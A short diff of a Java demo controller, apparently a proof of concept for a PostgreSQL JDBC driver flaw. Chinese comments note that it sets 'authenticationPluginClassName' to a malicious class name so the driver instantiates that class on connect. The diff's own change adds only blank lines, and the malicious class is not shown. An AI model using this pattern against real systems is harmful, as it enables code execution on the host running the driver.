@@ -251,9 +251,12 @@ public class DemoController {
         props.setProperty("password", "yourPassword");
         props.setProperty("authenticationPluginClassName", maliciousClassName); // 设置为恶意类名
 
+
+
         // PostgreSQL JDBC URL
         String jdbcUrl = "jdbc:postgresql://yourServer:5432/yourDatabase";
  
+        
         try {
             // 尝试建立连接，如果存在漏洞，将尝试实例化恶意类
             Connection conn = DriverManager.getConnection(jdbcUrl, props);
